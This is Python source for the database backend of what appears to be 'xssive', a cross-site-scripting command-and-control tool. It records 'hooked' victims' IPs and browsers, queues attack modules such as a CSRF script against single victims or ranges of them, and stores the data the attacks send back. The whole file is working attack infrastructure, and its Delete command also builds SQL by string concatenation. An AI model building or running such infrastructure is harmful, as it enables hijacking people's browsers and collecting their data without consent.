import web, string, os
import time
import json

#Comment out the following line for more detailed debug messages.
web.config.debug = False


#Database class allows easier control of the data
class Database:
	#On initializing replace default values
	def __init__(self, db_type, db_data):
		self.db_type = db_type
		self.db_data = db_data
		self.data = None
		self.db = None
	
	#This creates the required database tables.
	#It supports both SQlite and Mysql
	def Create_DB(self):
		#For Mysql
		if self.db_type == 'mysql' and self.db_data != None:
			try:
				self.data = string.split(self.db_data, ',')
				self.db = web.database(dbn=self.db_type, host=self.data[0],
					user=self.data[1], pw=self.data[2], db=self.data[3])
				#Creating table to store individual hooked users
				self.db.query('CREATE TABLE IF NOT EXISTS xssive (victimid'+
					' INT(10) NOT NULL PRIMARY KEY AUTO_INCREMENT, ip '+
					'VARCHAR(20) NOT NULL, browser VARCHAR(200) NOT NULL,'+
					' datetime INT(11) NOT NULL);')

				#Creating table to store attack information
				self.db.query('CREATE TABLE IF NOT EXISTS loaded_attack '+
					'(victimid INT(10) NOT NULL, module VARCHAR(100) NOT'+
					' NULL, time INT(11) NOT NULL);')

				#Creating table to store the attack result info
				self.db.query('CREATE TABLE IF NOT EXISTS attack_data'+
					'(victimid INT(10) NOT NULL, module VARCHAR(100) NOT'+
					' NULL, data VARCHAR(7500) NOT NULL, time INT(11) NOT'+
					' NULL);')

			except Exception, e:
				print ('\033[31mError: Problem creating MySQL Database or'+							' one of the tables Already Exists.\033[0m')
		
		#For Sqlite
		if self.db_type == 'sqlite' and self.db_data != None:
			try:
				self.db = web.database(dbn=self.db_type, db=self.db_data)
				
				#Creating table to store hooked users
				self.db.query('CREATE TABLE IF NOT EXISTS xssive (victimid'+
					' INTEGER PRIMARY KEY AUTOINCREMENT, ip STRING, '+
					'browser STRING, datetime INTEGER);')

				#Creating table to store attack information
				self.db.query('CREATE TABLE IF NOT EXISTS loaded_attack ('+
					'victimid INTEGER, module STRING, time INTEGER);')

				#Creating table to store attack result info
				self.db.query('CREATE TABLE IF NOT EXISTS attack_data ('+
					'victimid INTEGER, module STRING, data STRING, time'+
					' INTEGER);')

			except Exception, e:
				print ('\033[31mError: Local Database could not be creat'+
					'ed or one of the Tables already Exists.\033[0m')

	#This is used to store the initial user data for a successful hook.
	#It also returns a user id number to be used to identify this user.
	def Store_hook(self,data):
		self.db.insert('xssive',ip=data['ip'],browser=data['browser'],
				datetime=data['datetime'])
		
		return self.DB_size()

			
	#Returns the size of the hooked user Table.
	def DB_size(self):
		size = self.db.query('SELECT COUNT(*) as size from xssive')
		return size[0].size

	#Retrieve attack module to run
	def Get_Attack_Module(self, victimid):
		vicid = dict(vid=victimid)
		module_time = []
		module = list(self.db.query('SELECT module,time FROM loaded_attack WHERE '+
			'victimid=$vid ORDER BY time ASC LIMIT 1;',vicid))
		try:
			module_time.append(module[0].module)
			module_time.append(module[0].time)
			
		except:
			print 'No module loaded.'
		return module_time
			
			
	#Remove a module once it has been used.
	def Attack_remove(self, vicid, time):
		del_module = dict(vid=vicid,time=time)
		self.db.query('DELETE from loaded_attack where victimid=$vid'+
			' AND time=$time;',	del_module)	
		return ''

	#Return successful attack json data.
	def Attack_data(self):
		hook = {}
		att = {}
		hooked_json = []
		attack_json = []
		#Get information from database
		hooked = self.db.select('xssive')
		attack = self.db.select('attack_data')
		
		#Building json output.
		for i in hooked:
			try:	
				hook['victimid'] = str(i['victimid'])
				hook['ip'] = str(i['ip'])
				hook['browser'] = i['browser']
				hook['datetime'] = str(i['datetime'])
				hooked_json.append(dict(hook))
			except:
				pass
		for i in attack:
			try:
				att['victimid'] = str(i['victimid'])
				att['module'] = i['module']
				att['data'] = i['data']
				att['time'] = str(i['time'])
				attack_json.append(dict(att))
			except:
				pass
		
		jsonhook = '{ "hooked": '+json.dumps(hooked_json)+','
		jsonatt = '"attack": '+json.dumps(attack_json)+'}'
		xss_data = json.loads(jsonhook+jsonatt)
		return json.dumps(xss_data, sort_keys=True, indent=2)
		
	#This stores any attack data that may have been retrieved.
	def Attack_result(self, data):
		try:
			r_data = json.loads(data)
						
			self.db.insert('attack_data', 
				victimid=r_data['att_data'][0]['victimid'],
				module=r_data['att_data'][0]['module'], 
				data=r_data['att_data'][0]['data'],time=int(time.time()))
			return '{ "Success":"1" }'
				
		except ValueError:
			return '{ "error": "Incorrect request format." }'
		
		
	#This class parses commands concerning the control of this tool.
	def Exec_Command(self, cmd):
		cmds = json.loads(cmd)
		is_range=False
		try:
			vics = string.split(cmds['victimid'], ',')
			is_range=True
		except:
			is_range=False
		try:
			#Load an attack module for a single victim
			if cmds['command'] == 'Launch' and is_range==False:
				self.db.insert('loaded_attack',victimid=cmds['victimid'],
 					module='modules/'+cmds['module'],
					time=int(time.time()))
			
			#Load an attack module on multiple victims
			if cmds['command'] == 'Launch' and is_range==True:
				for i in range(int(vics[0]),int(vics[1])):
					self.db.insert('loaded_attack', victimid=i,
						module='modules/'+cmds['module'],
						time=int(time.time()))
			
			#Delete a loaded attack for a single victim
			if cmds['command'] == 'Delete' and is_range==False and cmds['module'] != 'all':
				self.db.delete('loaded_attack', where='victimid='+
					str(cmds['victimid'])+' AND module="modules/'+
					cmds['module']+'"')
			
			#Delete All loaded attacks
			if cmds['command'] == 'Delete' and cmds['module']=='all':
				self.db.delete('loaded_attack', where='victimid>0')
			
			#List available attack modules
			if cmds['command'] == 'List_Mod':
				return_mods = '{ "modules" : [ '
				for i in os.listdir("modules/"):
					return_mods += '{ "name":"'+str(i)+'"}  ,'
				response = return_mods[:-1] + '] }'
				return response
			
			#Clear all hooks
			if cmds['command'] == 'Clear':
				self.db.delete('xssive', where='victimid>0')


			return '{ "Success":"1" }'
		except:
			return '{ "error": "Incorrect request format." }'
	
	#For Testing (Fill with attacks)
	def TEST_FILL(self):
		for i in range(1,20):
			lol = self.db.insert('loaded_attack', victimid=i, 
				module='modules/csrf.js', time=int(time.time()))
